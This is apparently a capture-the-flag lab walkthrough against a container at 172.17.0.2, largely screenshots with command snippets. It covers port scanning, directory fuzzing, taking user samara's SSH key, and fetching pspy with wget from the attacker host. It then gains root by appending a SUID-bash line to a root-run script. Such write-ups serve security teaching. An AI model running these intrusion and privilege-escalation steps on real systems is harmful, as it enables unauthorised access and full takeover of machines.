![image](https://github.com/user-attachments/assets/2b6d0b83-239d-42e0-9127-422b519e8935)
```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```
![image](https://github.com/user-attachments/assets/ccf81df7-cd9c-4126-99b9-7c5c15ea2ccd)
![image](https://github.com/user-attachments/assets/80ec27a1-ebd8-48f8-93af-51e9dfcfe6f0)
![image](https://github.com/user-attachments/assets/fb008851-35d5-4868-b804-2dfcdb84e388)

## **Fuzzing Web**
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html,js
```
![image](https://github.com/user-attachments/assets/53455075-ad2c-474d-8e18-c583e3e183e7)

## ** We found this, an old version of the Web**
![image](https://github.com/user-attachments/assets/906c8c16-8e5b-4ac8-9102-b0eaba2323d1)

## **Lets do some tests**

![image](https://github.com/user-attachments/assets/9d9cb269-0e70-42c8-88d2-73a886e5415b)
![image](https://github.com/user-attachments/assets/08b09e0d-4c59-4446-a308-199373c629ac)

![image](https://github.com/user-attachments/assets/674f0cc6-1349-41de-8b43-7978e618dda4)
![image](https://github.com/user-attachments/assets/202601c3-fea5-4bcf-8b8c-b05730e2affd)

![image](https://github.com/user-attachments/assets/2c949548-7e27-4a69-8f65-f0eb1b4ac18d)
![image](https://github.com/user-attachments/assets/f1e31eeb-1f91-43de-ac54-4b76b1780395)

##** We found a User=samara, so now we have a option to do a Brute force or try to get a id_rsa**

![image](https://github.com/user-attachments/assets/db3de542-514c-4a6f-90f2-da49edd3df2f)
![image](https://github.com/user-attachments/assets/8afc8d7a-2fb8-4369-9ffc-4aedf3b948d9)

![image](https://github.com/user-attachments/assets/94647df5-6e11-44e3-a579-404d44952b28)
![image](https://github.com/user-attachments/assets/973bd65c-1b19-41d8-a672-261efc86f4be)

## **So now lets put all the info in a new file**
```bash
nano id_rsa
chmod 600 id_rsa
```
![image](https://github.com/user-attachments/assets/2a5bc8cd-52ea-40cc-88a2-dca886f0593f)

## **now let's connect via SSH with id_rsa**
```bash
ssh -i id_rsa samara@172.17.0.2
```
![image](https://github.com/user-attachments/assets/63cf819e-4638-41c0-bc54-0256eec976ca)

## **TTY**
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```
![image](https://github.com/user-attachments/assets/62c81923-838c-4856-ba5e-1b9f42738436)

## **elevating privileges**
```bash
find / -perm -4000 2>/dev/null
```
![image](https://github.com/user-attachments/assets/0ed0be1f-7954-4895-8ef0-e20358725ec1)

## **We review SUID permissions and we can see that we do not have anything that could be useful to us.**
## **So what we will do is upload pspy to the victim machine to see if we can get something useful.
We create a folder on our Kali machine and download the file to the victim machine https://github.com/DominicBreuker/pspy/releases.**
```bash
python3 -m http.server 80
```
![image](https://github.com/user-attachments/assets/1d4ffebd-96e3-4e96-b962-673172b23e05)

## **we upload the file to**
```bash
wget http://172.17.0.1/pspy64
```
![image](https://github.com/user-attachments/assets/a6ded6fa-8526-4c9a-b526-c828596388c8)
```bash
chmod +x pspy64
./pspy64
```
![image](https://github.com/user-attachments/assets/96800f80-4817-4a01-8f97-6301625e710f)

## **We observe that the echo.sh file is constantly running inside the path /usr/local/bin/echo.sh. If we do a cat of the file we see the following:**

![image](https://github.com/user-attachments/assets/787c0668-308b-4c97-94c0-8b44b8e58963)

## **we have to add this code at the end of the file to give it privileges**
```bash
chmod u+s /usr/bin/bash
```
![image](https://github.com/user-attachments/assets/1de73784-0665-4c0c-8bcf-4b56b1372430)

```bash
bash -p
```
![image](https://github.com/user-attachments/assets/0d743297-d50d-4338-9cf9-5ed6d6d7fa21)





